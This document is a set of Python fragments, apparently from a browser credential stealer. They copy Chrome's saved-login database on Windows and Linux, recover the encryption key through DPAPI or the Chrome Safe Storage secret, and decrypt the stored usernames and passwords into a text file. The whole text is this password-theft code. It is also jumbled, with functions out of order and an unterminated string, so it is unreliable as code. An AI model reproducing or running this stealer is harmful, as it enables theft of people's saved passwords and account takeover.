cred_db = os.path.expanduser("~") + os.sep + r"AppData\Local\Google\Chrome\User Data\default\Login data"

shutil.copy2(cred_db, "temp.db") 
conn = sqlite3.connect("temp.db")
cursor = conn.cursor()
cursor.execute("SELECT action_url,username_value,password_value from logins")
file = open("data.txt", 'a')
for r in cursor.fetchall():
    website = r[0]
    username = r[1]
    encrypted_password = r[2]
    password = decrypt(encrypted_password, Master_key)
    # print(f'website:{website} username:{username} password:{password}')
    data = {'website': website, 'username': username, 'password': password}
def get_MasterKey(): ##windows  ##Getting Master_key from Local state
    try:
        local_state=open(os.path.expanduser("~")+os.sep+r"AppData\Local\Google\Chrome\User Data\Local State","r",encoding="UTF-8")
        key_state=local_state.read()
        key=json.loads(key_state)
        key=base64.b64decode(key["os_crypt"]["encrypted_key"])
        key=key[5:]
        Master_key=win32crypt.CryptUnprotectData(key)[1]
        return Master_key
    except Exception as e:
        pass
def decrypt(password,Master_key): ##windows    #separating IV and password and decrypting data
    try:
        IV=password[3:15]
        data=password[15:]
        decrypt_object=AES.new(Master_key,AES.MODE_GCM,IV)
        decrypted_data=decrypt_object.decrypt(data)
        decrypted_data=decrypted_data[:-16] #Removing auth tag from payload
        return decrypted_data.decode()
    except:
        print("Chrome version < 80")
        bus = secretstorage.dbus_init()
        collection = secretstorage.get_default_collection(bus)
# collection.unlck()
        for item in collection.get_all_items():
            if item.get_label() == 'Chrome Safe Storage':
                key_pass = item.get_secret()

def Key_generate(key_pass): ##linux
    iterator = 1
    length = 16
    salt = b'saltysalt'
    key_pass = key_pass
    key = KDF.PBKDF2(key_pass, salt, length, iterator)
    return key

dbpath = f"/home/{getuser()}/.config/google-chrome/Default/"
shutil.copy(dbpath + "Login Data", 'LoginDatabase
conn = sqlite3.connect("LoginDatabase")
cursor = conn.cursor()
cursor.execute("""SELECT action_url,password_value,username_value FROM logins;""")
for data in cursor.fetchall():
    url = data[0]
    password = get_password(key, data[1])
    username = data[2]

def get_password(key, enc_passwd): ##linux
    IV = b' ' * 16
    key = key
    encrypted = enc_passwd[3:]
    aes_object = AES.new(key, AES.MODE_CBC, IV)
    decrypt_password = aes_object.decrypt(encrypted)
    return decrypt_password.strip().decode()

